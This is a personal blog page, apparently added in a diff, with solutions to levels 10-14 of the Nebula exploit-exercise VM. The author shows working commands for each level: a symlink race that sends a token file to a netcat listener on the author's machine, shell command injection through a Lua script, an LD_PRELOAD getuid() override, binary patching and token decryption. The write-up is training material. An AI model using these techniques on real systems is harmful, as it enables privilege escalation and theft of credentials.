@@ -1,0 +1,426 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Nebula Shell Exploits (Solutions 10-14) - Louis Li</title>
+	<meta name="author" content="Louis Li">
+
+	
+	<meta name="description" content="
+
+
+
+
+
+	Nebula Shell Exploits (Solutions 10-14)
+        Shell-based exploit exercises 
+	Overview
+This is the second post for my solutions of Exploit...">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta property="fb:admins" content="100001696373537" />
+
+	<link href="http://feeds.feedburner.com/louisligithub" rel="alternate" title="Louis Li" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://louisrli.github.io/blog/2012/06/28/nebula1/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+        <script type="text/javascript"
+            src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+          </script>
+	<link href='https://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
+	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="https://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="https://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-5225926150102880",
+          enable_page_level_ads: true
+     });
+</script>
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	<script type="text/javascript">
+		$(function(){
+                    $('.profilepic').append("<img src='https://www.gravatar.com/avatar/" + "9f050cf96c6cc933141f0242e5b723fd" + "?s=160' alt='Profile Picture' style='width: 160px;' />");
+		});
+	</script>
+</div>
+<hgroup>
+  <h1><a href="/">Louis Li</a></h1>
+  
+</hgroup>
+
+<p class="subtitle"></p>
+<nav id="main-nav"><ul class="main-navigation">
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="/blog/categories/projects">Sideprojects</a></li>
+  <li><a href="/publications">Publications</a></li>
+  <li><a href="http://github.com/louisrli">Github</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="mailto:pong@outlook.com">Contact</a></li>
+</ul>
+
+
+<section class="aboutme">
+  <p>
+    Harvard student and developer.
+  </p>
+</section>
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+		
+		<a class="github" href="https://github.com/louisrli" title="GitHub">GitHub</a>
+		
+		
+		<a class="rss" href="http://feeds.feedburner.com/louisligithub" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			<div class="mid-col-container">
+				<div id="content" class="inner"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Github top leaderboard -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5225926150102880"
+     data-ad-slot="1340213627"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<h1 class="title" itemprop="name">Nebula Shell Exploits (Solutions 10-14)</h1>
+        <h3 class="subtitle" itemprop="subtitle">Shell-based exploit exercises </h3>
+	<div class="entry-content" itemprop="articleBody"><h1 id="overview">Overview</h1>
+<p>This is the second post for my solutions of <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a></p>
+
+<h2 id="level-10">Level 10</h2>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level10">(full)</a>: Read a token file with the password to the target account. A suid program uses <code class="language-plaintext highlighter-rouge">access()</code> to upload a file to a host.</p>
+
+<p>According to <a href="http://linux.die.net/man/2/access">man access()</a>, there’s a race condition with this usage of the function:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">man access
+Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so
+using open(2) creates a security hole, because the user might exploit the short time interval between
+checking and opening the file to manipulate it. For this reason, the use of this system call should be
+avoided. (In the example just described, a safer alternative would be to temporarily switch the process's
+effective user ID to the real ID and then call open(2).)</span></code></pre></figure>
+
+<!-- more -->
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"> <span class="c">#!/bin/bash -x</span>
+ <span class="c"># upload_file.sh</span>
+<span class="nb">rm</span> ~/foo
+<span class="k">for </span>i <span class="k">in</span> <span class="sb">`</span><span class="nb">seq </span>10000<span class="sb">`</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"placeholder"</span> <span class="o">&gt;&gt;</span> ~/foo<span class="p">;</span> <span class="k">done</span>
+/home/flag10/flag10 ~/foo 192.168.1.6
+<span class="nb">sleep </span>0.0001
+<span class="nb">rm</span> ~/foo<span class="p">;</span> <span class="nb">ln</span> <span class="nt">-s</span> /home/flag10/token ~/foo</code></pre></figure>
+
+<p>Now, we can run this script repeatedly:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do</span> ./upload_file.sh<span class="p">;</span> <span class="k">done</span></code></pre></figure>
+
+<p>On our local machine (Linux or Mac), we also listen at intervals with <code class="language-plaintext highlighter-rouge">netcat</code>:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">localmachine$</span><span class="w"> </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span><span class="nb">sleep </span>1<span class="p">;</span> nc <span class="nt">-l</span> 18211 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"placeholder"</span><span class="p">;</span> <span class="k">done</span>
+<span class="go">.oO Oo.
+.oO Oo.
+plac
+.oO Oo.
+.oO Oo.
+.oO Oo.
+plac
+.oO Oo.
+plac
+.oO Oo.
+plac
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+.oO Oo.</span></code></pre></figure>
+
+<p>On the virtual machine:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>su flag10
+<span class="go">Password:
+</span><span class="gp">sh-4.2$</span><span class="w"> </span>getflag</code></pre></figure>
+
+<h2 id="level-11">Level 11</h2>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level11">(full)</a>: Execute <code class="language-plaintext highlighter-rouge">getflag</code> with the given source code.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> ~
+<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"Content-Length: 1</span><span class="se">\n\c</span><span class="s2">"</span> <span class="o">&gt;</span> ./foo
+<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"getflag; whoami"</span> <span class="o">&gt;</span> ./b
+<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>~:<span class="nv">$PATH</span>
+<span class="gp">$</span><span class="w"> </span>/home/flag11/flag11 &lt; ~/foo
+<span class="gp">sh: $</span><span class="s1">'b\200\263'</span>: <span class="nb">command </span>not found
+<span class="gp">$</span><span class="w"> </span>/home/flag11/flag11 &lt; ~/foo
+<span class="gp">sh: $</span><span class="s1">'b\300\241'</span>: <span class="nb">command </span>not found
+<span class="gp">$</span><span class="w"> </span>/home/flag11/flag11 &lt; ~/foo
+<span class="go">You have successfully executed getflag on a target account
+flag11</span></code></pre></figure>
+
+<p>This solution should be examined with the source code <a href="https://gist.github.com/1c924088f3df2ea27e6f#file_level11.c">(gist)</a>.</p>
+
+<p>This level was <em>great</em>.  These are the realizations that lead to a solution:</p>
+
+<ul>
+  <li>The solution path must end with the <code class="language-plaintext highlighter-rouge">system()</code> call in <code class="language-plaintext highlighter-rouge">process()</code>.</li>
+  <li>There are two ways to reach <code class="language-plaintext highlighter-rouge">process()</code> via the if-else branch in <code class="language-plaintext highlighter-rouge">main()</code>.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">else</code> branch is <em>extremely</em> random. It uses <code class="language-plaintext highlighter-rouge">mmap(NULL…)</code> (maps to a random memory address), <code class="language-plaintext highlighter-rouge">getrand()</code> (returns a random file descriptor), and XOR encryption.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">if</code> branch is <code class="language-plaintext highlighter-rouge">if (fread(buf, length, 1, stdin) != length)</code>. The third argument to <code class="language-plaintext highlighter-rouge">fread</code> is the number of members to read. The return value is the number of members read.</li>
+  <li>Things just got a lot simpler, since <code class="language-plaintext highlighter-rouge">length</code> must be 1.</li>
+  <li><code class="language-plaintext highlighter-rouge">process()</code> uses basic XOR encryption with the caveat that the key changes for each letter in the buffer. The buffer only has one letter, and <code class="language-plaintext highlighter-rouge">key = 1 &amp; 0xff</code>, which flips the last bit.</li>
+  <li>Looking at the <a href="http://ascii-table.com">ASCII table</a>, if we want the final buffer to contain <code class="language-plaintext highlighter-rouge">b</code> (<code class="language-plaintext highlighter-rouge">01100010</code>), the key needs to be applied to <code class="language-plaintext highlighter-rouge">01100011</code> (<code class="language-plaintext highlighter-rouge">c</code>).</li>
+  <li>Add an executable named <code class="language-plaintext highlighter-rouge">b</code> to the path, and let the program execute it until the buffer, by chance, ends with the string-terminating null byte.</li>
+</ul>
+
+<p>While walking to work, I laughed (in advance) thinking that the problem would have a deceivingly simple solution – and it did.</p>
+
+<h2 id="level-12">Level 12</h2>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level12">(full)</a>: Access the flag account through a Lua script that seems to send the token with a certan SHA1 checksum.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>nc 127.0.0.1 50001
+<span class="gp">Password: $</span><span class="o">(</span>getflag<span class="o">)</span>, which is <span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span> <span class="o">&gt;</span> ~/getflag.log
+<span class="go">Better luck next time
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/flag12/getflag.log
+<span class="go">You have successfully executed getflag on a target account, which is flag12</span></code></pre></figure>
+
+<p>According to the Internet, SHA1 checksums are, for all practical purposes, irreversible. This means that the solution path probably <em>doesn’t</em> require us to find the unhashed input.</p>
+
+<p>This turns out to be the case. We execute arbitrary code via this line, where our input is the variable <code class="language-plaintext highlighter-rouge">..password..</code>:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">prog = io.popen("echo "..password.." | sha1sum", "r")</span></code></pre></figure>
+
+<h2 id="level-13">Level 13</h2>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level13">(full)</a>: A program returns the token if the real uid is equal to <code class="language-plaintext highlighter-rouge">FAKEUID</code>, defined by a preprocessor macro.</p>
+
+<p>Given the source code, there seem to be two points of vulnerability for the program.</p>
+<ol>
+  <li>The call to <code class="language-plaintext highlighter-rouge">getuid()</code>: can we substitute our own version of the function?</li>
+  <li>The preprocessor macro for <code class="language-plaintext highlighter-rouge">FAKEUID</code>: can we redefine <code class="language-plaintext highlighter-rouge">FAKEUID</code>?</li>
+</ol>
+
+<h3 id="overriding-getuid">Overriding <code class="language-plaintext highlighter-rouge">getuid()</code></h3>
+
+<p>We link a shared library with our own function definition of <code class="language-plaintext highlighter-rouge">getuid()</code>, adding it through the <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> environmental variable. Because <code class="language-plaintext highlighter-rouge">suid</code> programs ignore <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code>, we copy the binary to our own directory and modify the permissions.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// custom_uid.c</span>
+<span class="cp">#include systypes.h
+</span>
+<span class="n">uid_t</span> <span class="nf">getuid</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="k">return</span> <span class="mi">1000</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="c"># Create a shared library</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> ~
+<span class="gp">$</span><span class="w"> </span>gcc <span class="nt">-fPIC</span> <span class="nt">-g</span> <span class="nt">-c</span> custom_uid.c
+<span class="gp">$</span><span class="w"> </span>gcc <span class="nt">-shared</span> <span class="nt">-W1</span>,-soname,uid.so <span class="nt">-o</span> uid.so custom_uid.o <span class="nt">-lc</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="k">*</span>.so
+<span class="go">uid.so</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="c"># Preload the shared library</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>./uid.so
+<span class="gp">$</span><span class="w"> </span><span class="nb">cp</span> /home/flag13/flag13 ~
+<span class="gp">$</span><span class="w"> </span>ldd flag13 | <span class="nb">grep </span>uid.so
+<span class="go">./uid.so (0x001c3000)
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">chmod </span>a+x ~/flag13
+<span class="gp">$</span><span class="w"> </span>~/flag13
+<span class="go">your token is b705702b-76a8-42b0-8844-3adabbe5ac58
+</span><span class="gp">$</span><span class="w"> </span>su flag13
+<span class="gp">sh-4.2$</span><span class="w"> </span>getflag
+<span class="go">You have successfully executed getflag on a target account</span></code></pre></figure>
+
+<p>I wasn’t familiar with these shared library vulnerabilities before these levels. To cite my sources, here are posts that I found during my search for “overriding functions”:</p>
+
+<ul>
+  <li><a href="http://stackoverflow.com/a/618059/892168">Overriding functions in C</a>, Stack Overflow.</li>
+  <li><a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Set_UID.pdf">Course notes for suid exploits</a>, Syracuse University</li>
+</ul>
+
+<h3 id="redefining-fakeuid">Redefining <code class="language-plaintext highlighter-rouge">fakeuid</code></h3>
+<p>Unfortunately, it turns out that we can’t quite “redefine” the preprocessor macro, since the binary is compiled without any debug flags from <code class="language-plaintext highlighter-rouge">gcc</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">FAKEUID</code> is defined by 1000 (hex: <code class="language-plaintext highlighter-rouge">0x03e8</code>). We can take a look at the assembly using <code class="language-plaintext highlighter-rouge">objdump</code>.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nv">$UID</span>
+<span class="go">1014
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">printf</span> <span class="s1">'%x\n'</span> 1014 <span class="c"># Our uid in hex</span>
+<span class="go">3f6
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">printf</span> <span class="s1">'%x\n'</span> 1000 <span class="c"># FAKEUID in hex</span>
+<span class="go">3e8
+</span><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-d</span> flag13 | <span class="nb">grep </span>3e8
+<span class="gp">80484f4:		3d e8 03 00 00		cmp 	__$</span>0x3e8__,%eax
+<span class="go">…
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cp</span> /home/flag13/flag13 ~
+<span class="gp">$</span><span class="w"> </span>vim ~/flag13
+<span class="gp">$</span><span class="w"> </span><span class="c"># … Make the substitution described below #</span></code></pre></figure>
+
+<p>Our magic number is represented by <code class="language-plaintext highlighter-rouge">3d e8</code> because of the <a href="http://en.wikipedia.org/wiki/Little_endian#Little-endian">little-endian architecture</a>. Our goal is to change <code class="language-plaintext highlighter-rouge">0x3e8</code> to <code class="language-plaintext highlighter-rouge">0x3f6</code>, which is 1014 in binary.</p>
+
+<p>vim can be used to <a href="http://stackoverflow.com/a/839549/892168">edit binary files</a>. (I’m an emacs user, but vim comes with the VM). We change <code class="language-plaintext highlighter-rouge">3de8</code> to <code class="language-plaintext highlighter-rouge">3df6</code> in the binary.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>~/flag13
+<span class="go">your token is b705702b-76a8-42b0-8844-3adabbe5ac58</span></code></pre></figure>
+
+<h2 id="level-14">Level 14</h2>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level13">(full)</a>: <code class="language-plaintext highlighter-rouge">flag14 -e</code> encrypts stdin. A token file needs to be decrypted.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
+<span class="c"># try.sh</span>
+<span class="c"># A helper function for pattern finding</span>
+try<span class="o">()</span>
+<span class="o">{</span>
+	<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$@</span><span class="s2">"</span> | /home/flag14/flag14 <span class="nt">-e</span><span class="p">;</span> <span class="nb">echo</span><span class="s2">""</span>
+<span class="o">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">source</span> ~/try.sh
+<span class="gp">$</span><span class="w"> </span>try 1<span class="p">;</span> try @<span class="p">;</span> try a
+<span class="go">1
+@
+a
+</span><span class="gp">$</span><span class="w"> </span>try 0231 <span class="c"># 0 - 0 = 0 | 3 - 2 = 1 | 5 - 3 = 2 |  4 - 1 = 3</span>
+<span class="go">0354</span></code></pre></figure>
+
+<p>If we play around more, there seems to be a simple pattern: the encryption scheme increments each character by its index.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// decrypt.c</span>
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="n">i</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>gcc <span class="nt">-std</span><span class="o">=</span>c99 <span class="nt">-o</span> decrypt decrypt.c
+<span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/flag14/token
+<span class="go">857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
+</span><span class="gp">$</span><span class="w"> </span>./decrypt <span class="si">$(</span><span class="nb">cat</span> /home/flag14/token<span class="si">)</span>
+<span class="go">8457c118-887c-4e40-a5a6-33a25353165
+</span><span class="gp">$</span><span class="w"> </span>su flag14
+<span class="go">Password:
+</span><span class="gp">sh4.2$</span><span class="w"> </span>getflag
+<span class="go">You have successfully executed getflag on a target account</span></code></pre></figure>
+
+</div>
+
+</article>
+
+	<div class="share">
+  <!--AddThis Button BEGIN -->
+  <div class="addthis_toolbox addthis_default_style addthis_32x32_style">
+    <a class="addthis_button_preferred_1"></a>
+    <a class="addthis_button_preferred_2"></a>
+    <a class="addthis_button_preferred_3"></a>
+    <a class="addthis_button_preferred_4"></a>
+    <a class="addthis_button_compact"></a>
+    <a class="addthis_counter addthis_bubble_style"></a>
+  </div>
+  <script type="text/javascript">var addthis_config = {"data_track_addressbar":true};</script>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-51e5a5762f46bbe9"></script>
+  <!-- AddThis Button END -->
+</div>
+
+
+
+<script async
+  src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Github bottom leaderboard -->
+<ins class="adsbygoogle"
+       style="display:block"
+            data-ad-client="ca-pub-5225926150102880"
+                 data-ad-slot="1968553857"
+                      data-ad-format="auto"
+                           data-full-width-responsive="true"></ins>
+  <script>
+         (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+
+
+<section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+</div>
+			</div>
+			<footer id="footer" class="inner"><p>
+  Copyright &copy; 2020 - Louis Li
+</p>
+
+Theme originally by <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a>
+</footer>
+			<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'llgithub';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://louisrli.github.io/blog/2012/06/28/nebula1/';
+        var disqus_url = 'http://louisrli.github.io/blog/2012/06/28/nebula1/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'https://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-32823730-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+
+
+		</div>
+	</div>
+</body>
+</html>
